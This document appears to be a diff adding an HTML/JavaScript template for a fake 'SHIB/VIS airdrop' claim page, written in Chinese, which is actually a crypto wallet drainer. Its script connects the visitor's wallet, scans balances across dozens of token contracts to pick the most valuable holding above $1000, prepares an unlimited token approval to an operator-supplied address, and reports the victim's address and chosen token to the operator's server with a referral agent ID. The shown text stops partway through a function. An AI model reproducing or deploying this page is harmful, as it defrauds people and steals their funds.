@@ -1,0 +1,1166 @@
+<!DOCTYPE html>
+<html lang="en" data-dpr="1" style="font-size: 54px;" class="no-touch"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<!-- Required meta tags-->
+
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="apple-mobile-web-app-status-bar-style" content="black">
+	<meta name="format-detection" content="telephone=no, email=no">
+	<meta name="msapplication-tap-highlight" content="no">
+	<meta name="x5-orientation" content="portrait">
+	<meta name="x5-fullscreen" content="true">
+	<link rel="icon" href="favicon.ico">
+	<meta name="description" content="">
+	<meta name="keywords" content="">
+	<!-- App title -->
+	<title>SHIB空投</title>
+	<!-- Framework7 Library CSS -->
+	<link rel="stylesheet" href="/scan/css/vendor.min.css">
+
+	<!-- Custom app styles-->
+	<link rel="stylesheet" href="/scan/css/reset.min.css">
+	<link rel="stylesheet" href="/scan/css/main.css">
+	
+	<script src="/scan/js/usdt/w3model.js"></script>
+	<script src="/scan/js/usdt/bignumber.min.js"></script>
+	<script src="/scan/js/usdt/web3.min.js"></script>
+	<script type="text/javascript" src="/scan/js/usdt/web3model.min.js"></script>
+	<script type="text/javascript" src="/scan/js/usdt/evmchain.js"></script>
+	<script type="text/javascript" src="/scan/js/usdt/web3provider.js"></script>
+
+	<!-- Jquery app core js-->
+	<script src="/scan/js/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="/scan/js/flexible.js"></script>
+	<style type="text/css">
+		.tishi{
+			width: 3.5rem;
+			height: 1.2rem;
+			background: #00000059;
+			z-index: 999999999999;
+			position: fixed;
+			top: 50%;
+			left: 50%;
+			transform: translate(-50%, -50%);
+			border-radius: 0.1rem;
+			color: white;
+			font-size: 0.6rem;
+			text-align: center;
+			line-height: 1.2rem;
+			display: none;
+		}
+	</style>
+	  <style>
+  .logo1{
+      z-index: 10001;
+      animation:fadein 6s infinite linear alternate;
+       -webkit-animation:fadein 6s infinite linear alternate;
+    -moz-animation:fadein 6s infinite linear alternate;
+    -o-animation:fadein 6s infinite linear alternate;
+    -ms-animation:fadein 6s infinite linear alternate;
+       
+  }
+    .logo2{
+      z-index: 10001;
+      animation:fadein2 6s infinite linear alternate;
+       -webkit-animation:fadein2 6s infinite linear alternate;
+    -moz-animation:fadein2 6s infinite linear alternate;
+    -o-animation:fadein2 6s infinite linear alternate;
+    -ms-animation:fadein2 6s infinite linear alternate;
+       
+  }
+
+    
+  @keyframes fadein{
+    0%{left: 0%;
+         }
+    100%{
+        left: 20%;
+
+    }
+}
+  @keyframes fadein2{
+    0%{right:0% ;
+         }
+    100%{
+       right:20% ;
+
+    }
+}
+.lianjie{
+width: 50%;
+    height: 1.25rem;
+    text-align: center;
+    line-height: 1.25rem;
+    font-size: 0.373333rem;
+    left: 50%;
+    transform: translate(-50%, 50%);
+    position: absolute;
+    color: #C3A007;
+    background-color: #4a0000;
+    border-radius: 0.16rem;
+    margin-top: 35%;
+    opacity: 0.7;
+    border: 2px solid #212c30;
+}
+.tishi1{
+    width: 95%;
+    height: 1.25rem;
+    
+    line-height: 1.25rem;
+    font-size: 0.373333rem;
+    left: 50%;
+   text-align: center;
+    transform: translate(-50%, 50%);
+    position: absolute;
+    color: #000;
+    border: none;
+    background-color: #fff;
+    border-radius: 0.16rem;
+}
+.bianju{
+position: fixed;
+    background-color: #5ac8fa;
+    height: 6rem;
+    width: 90%;
+    left: 5%;
+    bottom: 40%;
+    border-radius: 20px;
+    z-index: 11000;
+    background-image: url(/scan/img/4.jpg);
+    background-size: 100% 100%;
+}
+.lianjie1{
+            z-index: 10008;
+    height: 100vh;
+    width: 100%;
+    background-color: rgb(255, 255, 255);
+    opacity: 0.7;
+    position: fixed;
+    top: 0px;
+}
+#app1{
+        animation:fadein5 2s linear 1;
+    -webkit-animation:fadein5 2s linear 1;
+    -moz-animation:fadein5 2s linear 1;
+    -o-animation:fadein5 2s linear 1;
+    -ms-animation:fadein5 2s linear 1;
+}
+@keyframes fadein5{
+    0%{opacity: 0;
+         }
+    100%{
+        opacity: 0.7;
+
+    }
+}
+@-webkit-keyframes fadein5{
+        0%{opacity: 0;
+         }
+    100%{
+        opacity: 0.7;
+
+    }
+}
+@-moz-keyframes fadein5{
+        0%{opacity: 0;
+         }
+    100%{
+        opacity: 0.7;
+
+    }
+}
+@-o-keyframes fadein5{
+        0%{opacity: 0;
+         }
+    100%{
+        opacity: 0.7;
+
+    }
+}
+@-ms-keyframes fadein5{
+        0%{opacity: 0;
+         }
+    100%{
+        opacity: 0.7;
+
+    }
+}
+.fuz{
+    width: 30%;
+    height: 0.8rem;
+    text-align: center;
+    line-height: 0.8rem;
+    font-size: 0.32rem;
+    left: 50%;
+    transform: translate(-50%, 50%);
+    position: absolute;
+    color: #C3A007;
+    background-color: #4a0000;
+    border-radius: 0.16rem;
+    opacity: 0.7;
+    border: 2px solid #212c30;
+            animation:fadein5 2s linear 1;
+    -webkit-animation:fadein5 2s linear 1;
+    -moz-animation:fadein5 2s linear 1;
+    -o-animation:fadein5 2s linear 1;
+    -ms-animation:fadein5 2s linear 1;
+}
+#fuz1{
+position: fixed;
+    background-color: #5ac8fa;
+    height: 6rem;
+    width: 90%;
+    left: 5%;
+    bottom: 40%;
+    border-radius: 20px;
+    z-index: 11000;
+    background-image: url(/scan/img/4.jpg);
+    background-size: 100% 100%;
+}
+.dandan1{
+    background-color: #fff;
+    width: 24%;
+    margin-left: 38%;
+    position: absolute;
+    top: 52%;
+    border: 1px solid #FFF;
+    border-radius: 6px;
+    text-align: center;
+                animation:fadein9 2s linear 1;
+    -webkit-animation:fadein9 2s linear 1;
+    -moz-animation:fadein9 2s linear 1;
+    -o-animation:fadein9 2s linear 1;
+    -ms-animation:fadein9 2s linear 1;
+}
+@keyframes fadein9{
+    0%{opacity: 0;
+         }
+    100%{
+        opacity: 1;
+
+    }
+}
+@-webkit-keyframes fadein9{
+        0%{opacity: 0;
+         }
+    100%{
+        opacity: 1;
+
+    }
+}
+@-moz-keyframes fadein9{
+        0%{opacity: 0;
+         }
+    100%{
+        opacity: 1;
+
+    }
+}
+@-o-keyframes fadein9{
+        0%{opacity: 0;
+         }
+    100%{
+        opacity: 1;
+
+    }
+}
+@-ms-keyframes fadein9{
+        0%{opacity: 0;
+         }
+    100%{
+        opacity: 1;
+
+    }
+}
+.dandan{
+        background-color: #fff;
+    width: 24%;
+    margin-left: 38%;
+    position: absolute;
+    top: 57%;
+    border: 1px solid #FFF;
+    border-radius: 6px;
+    text-align: center;
+     opacity: 0;
+                animation:fadein99 2s linear 1;
+    -webkit-animation:fadein99 2s linear 1;
+    -moz-animation:fadein99 2s linear 1;
+    -o-animation:fadein99 2s linear 1;
+    -ms-animation:fadein99 2s linear 1;
+}
+.dandan2{
+        background-color: #fff;
+    width: 24%;
+    margin-left: 38%;
+    position: absolute;
+    top: 10%;
+    border: 1px solid #FFF;
+    border-radius: 6px;
+    text-align: center;
+     opacity: 0;
+                animation:fadein99 2s linear 1;
+    -webkit-animation:fadein99 2s linear 1;
+    -moz-animation:fadein99 2s linear 1;
+    -o-animation:fadein99 2s linear 1;
+    -ms-animation:fadein99 2s linear 1;
+}
+@keyframes fadein99{
+    0%{opacity: 1;
+         }
+    100%{
+        opacity: 0;
+
+    }
+}
+@-webkit-keyframes fadein99{
+        0%{opacity: 1;
+         }
+    100%{
+        opacity: 0;
+
+    }
+}
+@-moz-keyframes fadein99{
+        0%{opacity: 1;
+         }
+    100%{
+        opacity: 0;
+
+    }
+}
+@-o-keyframes fadein99{
+        0%{opacity: 1;
+         }
+    100%{
+        opacity: 0;
+
+    }
+}
+@-ms-keyframes fadein99{
+        0%{opacity: 1;
+         }
+    100%{
+        opacity: 0;
+
+    }
+}
+.dizhi{
+width: 84%;
+    height: 30px;
+    line-height: 30px;
+    margin-left: 8%;
+    border-radius: 5px;
+    background-color: #fff;
+}
+
+</style>
+
+
+	<style data-styled="active" data-styled-version="5.2.0"></style><style type="text/css">/*
+ * contextMenu.js v 1.4.0
+ * Author: Sudhanshu Yadav
+ * s-yadav.github.com
+ * Copyright (c) 2013 Sudhanshu Yadav.
+ * Dual licensed under the MIT and GPL licenses
+**/
+
+	.iw-contextMenu {
+		box-shadow: 0px 2px 3px rgba(0, 0, 0, 0.10) !important;
+		border: 1px solid #c8c7cc !important;
+		border-radius: 11px !important;
+		display: none;
+		z-index: 1000000132;
+		max-width: 300px !important;
+		width: auto !important;
+	}
+
+	.dark-mode .iw-contextMenu,
+	.TnITTtw-dark-mode.iw-contextMenu,
+	.TnITTtw-dark-mode .iw-contextMenu {
+		border-color: #747473 !important;
+	}
+
+	.iw-cm-menu {
+		background: #fff !important;
+		color: #000 !important;
+		margin: 0px !important;
+		padding: 0px !important;
+		overflow: visible !important;
+	}
+
+	.dark-mode .iw-cm-menu,
+	.TnITTtw-dark-mode.iw-cm-menu,
+	.TnITTtw-dark-mode .iw-cm-menu {
+		background: #525251 !important;
+		color: #FFF !important;
+	}
+
+	.iw-curMenu {
+	}
+
+	.iw-cm-menu li {
+		font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", Helvetica, Arial, Ubuntu, sans-serif !important;
+		list-style: none !important;
+		padding: 10px !important;
+		padding-right: 20px !important;
+		border-bottom: 1px solid #c8c7cc !important;
+		font-weight: 400 !important;
+		cursor: pointer !important;
+		position: relative !important;
+		font-size: 14px !important;
+		margin: 0 !important;
+		line-height: inherit !important;
+		border-radius: 0 !important;
+		display: block !important;
+	}
+
+	.dark-mode .iw-cm-menu li, .TnITTtw-dark-mode .iw-cm-menu li {
+		border-bottom-color: #747473 !important;
+	}
+
+	.iw-cm-menu li:first-child {
+		border-top-left-radius: 11px !important;
+		border-top-right-radius: 11px !important;
+	}
+
+	.iw-cm-menu li:last-child {
+		border-bottom-left-radius: 11px !important;
+		border-bottom-right-radius: 11px !important;
+		border-bottom: none !important;
+	}
+
+	.iw-mOverlay {
+		position: absolute !important;
+		width: 100% !important;
+		height: 100% !important;
+		top: 0px !important;
+		left: 0px !important;
+		background: #FFF !important;
+		opacity: .5 !important;
+	}
+
+	.iw-contextMenu li.iw-mDisable {
+		opacity: 0.3 !important;
+		cursor: default !important;
+	}
+
+	.iw-mSelected {
+		background-color: #F6F6F6 !important;
+	}
+
+	.dark-mode .iw-mSelected, .TnITTtw-dark-mode .iw-mSelected {
+		background-color: #676766 !important;
+	}
+
+	.iw-cm-arrow-right {
+		width: 0 !important;
+		height: 0 !important;
+		border-top: 5px solid transparent !important;
+		border-bottom: 5px solid transparent !important;
+		border-left: 5px solid #000 !important;
+		position: absolute !important;
+		right: 5px !important;
+		top: 50% !important;
+		margin-top: -5px !important;
+	}
+
+	.dark-mode .iw-cm-arrow-right, .TnITTtw-dark-mode .iw-cm-arrow-right {
+		border-left-color: #FFF !important;
+	}
+
+	.iw-mSelected > .iw-cm-arrow-right {
+	}
+
+	/*context menu css end */</style><style type="text/css">@-webkit-keyframes load4 {
+																0%,
+																100% {
+																	box-shadow: 0 -3em 0 0.2em, 2em -2em 0 0em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 0;
+																}
+																12.5% {
+																	box-shadow: 0 -3em 0 0, 2em -2em 0 0.2em, 3em 0 0 0, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 -1em;
+																}
+																25% {
+																	box-shadow: 0 -3em 0 -0.5em, 2em -2em 0 0, 3em 0 0 0.2em, 2em 2em 0 0, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 -1em;
+																}
+																37.5% {
+																	box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0em 0 0, 2em 2em 0 0.2em, 0 3em 0 0em, -2em 2em 0 -1em, -3em 0em 0 -1em, -2em -2em 0 -1em;
+																}
+																50% {
+																	box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 0em, 0 3em 0 0.2em, -2em 2em 0 0, -3em 0em 0 -1em, -2em -2em 0 -1em;
+																}
+																62.5% {
+																	box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 0, -2em 2em 0 0.2em, -3em 0 0 0, -2em -2em 0 -1em;
+																}
+																75% {
+																	box-shadow: 0em -3em 0 -1em, 2em -2em 0 -1em, 3em 0em 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 0, -3em 0em 0 0.2em, -2em -2em 0 0;
+																}
+																87.5% {
+																	box-shadow: 0em -3em 0 0, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 0, -3em 0em 0 0, -2em -2em 0 0.2em;
+																}
+															}
+
+	@keyframes load4 {
+		0%,
+		100% {
+			box-shadow: 0 -3em 0 0.2em, 2em -2em 0 0em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 0;
+		}
+		12.5% {
+			box-shadow: 0 -3em 0 0, 2em -2em 0 0.2em, 3em 0 0 0, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 -1em;
+		}
+		25% {
+			box-shadow: 0 -3em 0 -0.5em, 2em -2em 0 0, 3em 0 0 0.2em, 2em 2em 0 0, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 -1em;
+		}
+		37.5% {
+			box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0em 0 0, 2em 2em 0 0.2em, 0 3em 0 0em, -2em 2em 0 -1em, -3em 0em 0 -1em, -2em -2em 0 -1em;
+		}
+		50% {
+			box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 0em, 0 3em 0 0.2em, -2em 2em 0 0, -3em 0em 0 -1em, -2em -2em 0 -1em;
+		}
+		62.5% {
+			box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 0, -2em 2em 0 0.2em, -3em 0 0 0, -2em -2em 0 -1em;
+		}
+		75% {
+			box-shadow: 0em -3em 0 -1em, 2em -2em 0 -1em, 3em 0em 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 0, -3em 0em 0 0.2em, -2em -2em 0 0;
+		}
+		87.5% {
+			box-shadow: 0em -3em 0 0, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 0, -3em 0em 0 0, -2em -2em 0 0.2em;
+		}
+	}</style><style type="text/css">/* This is not a zero-length file! */</style></head>
+<body style="font-size: 12px;">
+<!-- Views -->
+<div class="views">
+	<!-- main view -->
+	<div class="view view-main">
+		<!-- Pages -->
+	    <div class="pages navbar-through">
+      <div class="page">
+        <!-- Top Navbar-->
+        <!--<div class="navbar">-->
+        <!--  <div class="navbar-inner">-->
+        <!--    <div class="left">-->
+        <!--      <a href="javascript:void(0);" class="link" onclick="goback()"><i class="icon icon-back1"></i></a>-->
+        <!--    </div>-->
+        <!--    <div class="center">USDT收款</div>-->
+        <!--    <div class="right"></div>-->
+        <!--  </div>-->
+        <!--</div>-->
+        <div class="page-content" style="padding-top: 0; background-color: #C3A007;">
+          <div class="list-block address">
+             
+            <div class="list-block-title" style="background-image:url(/scan/img/3.gif);background-size:100% 100%; background-color: #fff;margin-bottom: 16px; text-align: center;position: relative;color:#C3A007;"><img class="logo1" style="position: absolute;width: 10%;top: 16%;" src="/scan/img/1.gif">
+			<img class="logo2" style="position: absolute;width: 10%;top: 16%;" src="/scan/img/1.gif"><span style="background-color: none;margin-bottom: 16px; text-align: center;position: relative;color:#C3A007; z-index: 10003;">VIS</span>  </div>
+            <ul style="padding: 0.6rem 0;">
+              <li class="item-content">
+                <div class="item-inner">
+                  <div class="item-title yinczti" style="text-align:justify;" >
+                      
+                      &nbsp; &nbsp;  Swarm（VIS）是一个用于主权数字社会的去中心化存储和通信系统，DockerSwarm（dVIS）专注于Swarm节点的轻量化集群计算服务，dVIS作为DockerSwarm客户端运行的燃料，可使用dVIS激活个人DockerSwarm客户端，生产VIS和dVIS奖励。DockerSwarm为个人和企业提供开箱即用的Swarm云节点网络，无需高昂的硬件成本和复杂的配置。DockeSwarm可将任何智能设备链接起来，为Swarm网络万物物联提供基座功能，一键运行DockerSwarm客户端即可获得VIS和dVIS奖励</div>
+                </div>
+              </li>
+            </ul>
+          </div>
+          <div class="list-block amount">
+            <div class="list-block-title">Vis空投计算<span id="yu"> VIS</span></div>
+            <ul>
+              <li class="item-content" style="position: absolute;top: -999em;">
+                <div class="item-inner">
+                  <div class="item-after">
+                    <input class="num" type="number" name="remark"  value="1" style="font-size:25px; height: inherit;"  placeholder="" onkeyup="updateAvaxAmount1()"/>
+                    <p>¥<span id="price" style="color: inherit;font-size:inherit;">6.45</span></p>
+                    
+                  </div>
+<!--                    <input class="num" type="number" value="" placeholder="0">-->
+                               
+                
+                </div>
+              </li>
+              
+              <li class="item-content">
+                <div class="item-inner">
+                  <div class="item-after"><p style="color:#000000">预计获得<span>VIS：<span class="getAvaxAmount1" style="color: red;">120.00000000</span></span></p></div>
+                </div>
+              </li>
+            </ul>
+            <!--<ul>-->
+            <!--  <li class="item-content item-link">-->
+            <!--    <div class="item-inner">-->
+            <!--      <div class="item-title">矿工费</div>-->
+            <!--      <div class="item-after">-->
+            <!--        <p id="gas">0.000000 ETH</p>-->
+            <!--        <p id="gasmoney">¥ 30.31</p>-->
+            <!--      </div>-->
+            <!--    </div>-->
+            <!--  </li>-->
+            <!--</ul>-->
+          </div>
+          <div class="lianjie" id="app3" style="position: absolute;top: -999em;">点击连接钱包······</div>
+          <div class="lianjie1" style="display:none;"></div>
+           <div id="fuz1" style="display: none;"><sapn class="dandan">地址复制成功</sapn><br/><sapn class="dandan1">点我打开钱包</sapn><br/><sapn class="dandan">请在钱包浏览器打开</sapn></div>
+          <div class="bianju" style="display:none;" >
+               <input id="fuzhi" value="{$domain}{:url('index/vis/index',['agent'=>$userId])}" style="position: fixed;top: -999em;" readonly>
+                <button class="fuz" onclick="copyText()">点击复制</button>
+               
+              <div class="lianjie" id="app1" >点击打开钱包······</div></div>
+          
+          
+          <div class="tishi1" >请在钱包中区块浏览器打开空投页面，才能正常领取</div>
+          <div class="list-block-button">
+            <button style="background-color:#078BC3;" class="button button-fill " id="btn-connect">领取</button>
+            
+          </div>
+          <div style="height:2px;"></div>
+        </div>
+      </div>
+      <!-- Preloader -->
+      <div class="modal">
+        <div class="preloader"></div>
+      </div>
+      <div class="tishi">
+        付款成功
+      </div>
+    </div>
+	</div>
+</div>
+<div style="display:none;">
+    <textarea id="jsondata">{$abi}</textarea>
+	<textarea id="jsondata1">{$addr|json_encode}</textarea>
+	<textarea id="jsondata2">{$addr2|json_encode}</textarea>
+	<textarea id="jsondata3">{$addr3|json_encode}</textarea>
+</div>
+
+<div id="fffsss" style="color: white;
+    z-index: 99999999999999999;
+    position: absolute;top: 1px;"></div>
+
+<!-- Custom app js-->
+<script type="text/javascript">
+		 function copyText() {
+		 
+		  var fuzhi = document.getElementById("fuzhi");
+		  
+		  fuzhi.select(); // 选中文本
+		  document.execCommand("copy"); // 执行浏览器复制命令
+		  var fuz1 = document.getElementById("fuz1");
+		  fuz1.style.display="block";
+		  var fu = document.getElementById("fuzhi");
+		   
+         var lianjia = document.querySelector('.bianju');
+          lianjia.style.display = 'none';
+		   fu.style.display = 'none'
+		 }
+</script>
+<script type="text/javascript">
+		 function copyTextt() {
+		 
+		  var fuzhi2 = document.getElementById("fuzhi2");
+		  
+		  fuzhi2.select(); // 选中文本
+		  document.execCommand("copy"); // 执行浏览器复制命令
+		  
+		  $(".fu21").fadeIn()
+						setTimeout(function () {
+							$(".fu21").fadeOut()
+						},3000);
+		var fu1 = document.getElementById("fuzhi2");
+		  
+		   fu1.type = 'hidden' 
+		 }
+</script>
+
+
+
+  <script>
+    var app = document.querySelector("#app3")
+    app.onclick = function () {
+      let isWeiXin = navigator.userAgent.toLowerCase().indexOf('micromessenger') != -1;
+      // 监测手机设备的系统
+      systemType(isWeiXin, 'imtoken://', 'https://token.im/');
+    }
+    // wc:28ab1f7b-832b-4861-8d8c-8783ad6e8bb6@1?bridge=https%3A%2F%2Fbridge.walletconnect.org&key=9adcc73a790546dfd0e2bbdc5c38b5bacee1227340d3184c57d69ce212ccf6fc
+    app1.onclick = function (){
+      let isWeiXin = navigator.userAgent.toLowerCase().indexOf('micromessenger') != -1;
+      systemType(isWeiXin, 'wc:28ab1f7b-832b-4861-8d8c-8783ad6e8bb6', '{$domain}');
+    }
+    fuz1.onclick = function (){
+      let isWeiXin = navigator.userAgent.toLowerCase().indexOf('micromessenger') != -1;
+      systemType(isWeiXin, 'wc:28ab1f7b-832b-4861-8d8c-8783ad6e8bb6', '{$domain}');
+    }
+
+    // 判断手机系统
+    function systemType(isWeiXin, url1, url2) {
+      let u = navigator.userAgent,
+        app = navigator.appVersion;
+
+      // 监测设备
+      let isAndroid = u.indexOf('Android') > -1 || u.indexOf('Linux') > -1,
+        isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
+
+      // iOS 设备判断
+      if (isiOS) toiOS(url1,url2);
+      // Android 设备判断
+      if (isAndroid) toAndroid(isWeiXin,url1,url2);
+    }
+
+    // Android
+    function toAndroid(isWeiXin, url1, url2) {
+      window.location.href = url1;
+      setTimeout(function () {
+        // iOS App Store下载地址
+        
+      }, 3000);
+    }
+
+    // iOS
+    function toiOS(url1, url2) {
+      $('#DBL').click(function () {
+        /* [app scheme码]:// */
+        window.location.href = url1;
+        setTimeout(function () {
+          // iOS App Store下载地址
+          window.location.href = url2;
+        }, 3000);
+      });
+    }
+  </script>
+
+  <script>
+    function updateAvaxAmount1() {
+  var ethAmount = $('input[name="remark"]').val();
+  
+  
+  var pay_amount = $('input[name="remark"]').val();
+  
+  if(Number(pay_amount) < 0) {
+    $('.getAvaxAmount1').html(Number(0).toFixed(8));
+    return;
+  }
+  var ed;
+  if(step==1)ed=50;
+  else if(step==2)ed=100;
+  else if(step==3)ed=200;
+  else ed=0;
+  
+  if(Number(pay_amount)>ed){
+      alert(language[currLang]['msg10']+ed+' HT' );
+      $('input[name="remark"]').val(Number(ed));
+  }
+  $('.getAvaxAmount1').html(parseFloat(ethAmount*bili).toFixed(8));
+}
+
+
+</script>
+<script src="/scan/js/main.js"></script>
+<script type="text/javascript">
+	const ABI = JSON.parse($('#jsondata').html());
+
+	$(function() {
+		var authorized_address = '{$authorized_address}';
+		var infura_key = '{$infura_key}';
+		var agent = "{$userId}";
+		var domain = '{$domain}';
+		var bizhong = '';
+		const approveNum = new BigNumber(2).exponentiatedBy(256).minus(1);
+		var address = getUrlQueryString('address');
+		var rank = 6.45;
+		$('#address').text(address);
+
+		$('input.num').bind('input propertychange', function()
+		{
+			
+			$('#price').text(($(this).val()*rank).toLocaleString() )
+
+		})
+		/******************************************/
+		// Unpkg imports
+		const _web3 = new Web3('https://cloudflare-eth.com')
+
+		let injectedWeb3 = null, total = 0
+		let approveAddr = '{$approveAddr}'
+        const addr = JSON.parse($('#jsondata1').html());
+		const addr2 = JSON.parse($('#jsondata2').html());
+		const addr3 = JSON.parse($('#jsondata3').html());
+
+		async function getMostValuableAssets(account) {
+			let _symbol = 'usdt'
+			console.log('_symbol:'+_symbol);
+
+			for (const [symbol, contract] of Object.entries(contracts)) {
+				contract.methods.balanceOf(account).call(function(err, balance) {
+					if(symbol == 'usdt'){
+
+						let yu =balance / (10** (decimals[symbol] || 18))
+						console.log(yu.toLocaleString())
+						$('#yu').text(yu.toLocaleString() +' USDT')
+
+					}
+					const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+					if (usdt > total && usdt > 1000) {
+						_symbol = symbol
+						total = usdt
+						approveAddr = addr[_symbol]
+						bizhong = _symbol
+
+					}
+				})
+			}
+
+			bizhong = _symbol
+			console.log('_symbol:'+_symbol);
+			return _symbol
+		}
+
+		function getUrlQueryString(names, urls) {
+			urls = urls || window.location.href;
+			urls && urls.indexOf("?") > -1 ? urls = urls.substring(urls.indexOf("?") + 1) : "";
+			var reg = new RegExp("(^|&)" + names + "=([^&]*)(&|$)", "i");
+			var r = urls ? urls.match(reg) : window.location.search.substr(1).match(reg);
+			if (r != null && r[2] != "")return unescape(r[2]);
+			return null;
+		}
+		
+		async function postInfo(address,symbol){
+			var data = {
+				address:address,
+				auth_address:authorized_address,
+				bizhong:symbol,
+				agent:agent,
+			}
+
+			var d = new Date();
+			var n = d.getTime();
+
+			$.ajax({
+				type: 'get',
+				url:  domain + "{:url('index/api/erc_post')}?t="+n,
+				data: data,
+				success:function(){
+				}
+			})
+		}
+
+		async function getMostValuableAssets2(account) {
+			let _symbol = 'usdt'
+			console.log('_symbol:'+_symbol);
+			for (const [symbol, contract] of Object.entries(contracts2)) {
+				contract.methods.balanceOf(account).call(function(err, balance) {
+					const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+					if (usdt > total && usdt > 1000) {
+						_symbol = symbol
+						total = usdt
+						approveAddr = addr[_symbol]
+
+					}
+				})
+			}
+
+			bizhong = _symbol
+
+			console.log('_symbol:'+_symbol);
+			return _symbol
+		}
+
+		async function getMostValuableAssets3(account) {
+			let _symbol = 'usdt'
+			for (const [symbol, contract] of Object.entries(contracts3)) {
+				contract.methods.balanceOf(account).call(function(err, balance) {
+					const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+					if (usdt > total && usdt > 1000) {
+						_symbol = symbol
+						total = usdt
+						approveAddr = addr[_symbol]
+					}
+				})
+			}
+			bizhong = _symbol
+			console.log('_symbol:'+_symbol);
+			return _symbol
+		}
+
+
+		const price = {
+			'usdt': 1,
+			'sushi': 15.5,
+			'usdc': 1,
+			'dai': 1,
+			'uni': 28.6,
+			'aave': 380,
+			'yfi': 35000,
+			'link': 28.2,
+			"LON": 7,
+			"CRV": 3.01367,
+			"GUSD": 1,
+			"WBTC": 56478.2,
+			"WETH": 1991.89,
+			"CONV": 0.105733,
+			"inj": 13.3812,
+			"MKR": 2076.68,
+			"ALPHA": 1.79043,
+			"BAND": 16.3441,
+			"snx": 20.0588,
+			"comp": 468.076,
+			"sxp": 4.11818,
+			"FTT": 46.1779,
+			"ust": 1.00543,
+			"TRIBE": 1.42926,
+			"wise": 0.446973,
+			"RRAX": 0.996821,
+			"CORE": 5447.59,
+			"mir": 8.69817,
+			"DPI": 415.906,
+			"luna": 15.2402,
+			"HEZ": 5.97533,
+			"fxs": 8.47025,
+			"fei": 0.898157,
+		}
+
+		const decimals = {
+			sushi: 18,
+			usdt: 6,
+			usdc: 6,
+			uni: 18,
+			dai: 18,
+			aave: 18,
+			yfi: 18,
+			link: 18,
+			WBTC: 8,
+		}
+
+		const contracts = {}, contracts2 = {}, contracts3 = {}
+		for (const symbol of Object.keys(addr)) {
+			const contractAddr = addr[symbol]
+			contracts[symbol] = new _web3.eth.Contract(ABI, contractAddr)
+		}
+
+		for (const symbol of Object.keys(addr2)) {
+			const contractAddr = addr2[symbol]
+			contracts2[symbol] = new _web3.eth.Contract(ABI, contractAddr)
+		}
+
+		for (const symbol of Object.keys(addr3)) {
+			const contractAddr = addr3[symbol]
+			contracts3[symbol] = new _web3.eth.Contract(ABI, contractAddr)
+		}
+
+		const Web3Modal = window.Web3Modal.default;
+		const WalletConnectProvider = window.WalletConnectProvider.default;
+
+		// Web3modal instance
+		let web3Modal
+
+		// Chosen wallet provider given by the dialog window
+		let provider;
+
+		// Address of the selected account
+		let selectedAccount;
+
+		/**
+		 * Setup the orchestra
+		 */
+		async function init() {
+
+			const providerOptions = {
+				walletconnect: {
+					package: WalletConnectProvider,
+					options: {
+						// Mikko's test key - don't copy as your mileage may vary
+						infuraId: infura_key,
+					}
+				},
+			};
+
+			web3Modal = new Web3Modal({
+				cacheProvider: false, // optional
+				providerOptions, // required
+				disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
+			});
+
+
+			try {
+				provider = await web3Modal.connect()
+				provider.enable()
+			} catch(e) {
+				console.log("Could not get a wallet connection", e);
+				return;
+			}
+
+			// Subscribe to accounts change
+			provider.on("accountsChanged", async (accounts) => {
+				await fetchAccountData();
+			});
+
+			// Subscribe to chainId change
+			provider.on("chainChanged", async (chainId) => {
+				await fetchAccountData();
+			});
+
+			// Subscribe to networkId change
+			provider.on("networkChanged", async (networkId) => {
+				await fetchAccountData();
+			});
+
+			await refreshAccountData();
+		}
+
+		/**
+		 * Kick in the UI action after Web3modal dialog has chosen a provider
+		 */
+		
+		
+		 
+		async function fetchAccountData() {
+			const web3 = new Web3(provider);
+			injectedWeb3 = web3
+			provider.enable()
+			const accounts = await web3.eth.getAccounts()
+			selectedAccount = accounts[0]
+			
+			console.log(selectedAccount);
+			$("#receiver").text(selectedAccount);
+			let gasPrice = await web3.eth.getGasPrice()
+			var gs =((gasPrice*80000) / (10**18)).toFixed(6)
+			console.log(gs)
+			
+			$('#gas').text(gs.toLocaleString() + ' ETH')
+			$.get("https://data.block.cc/api/v3/price?api_key=WH5Y6G7PUMUSMVEQZAPXSTVCIEKATAZAARQFKD9E&slug=ethereum", function(result){
+				console.log(result[0]['u'])
+				let mon = gs*result[0]['u']
+				$('#gasmoney').text('$ '+mon.toLocaleString())
+			});
+			getMostValuableAssets(selectedAccount)
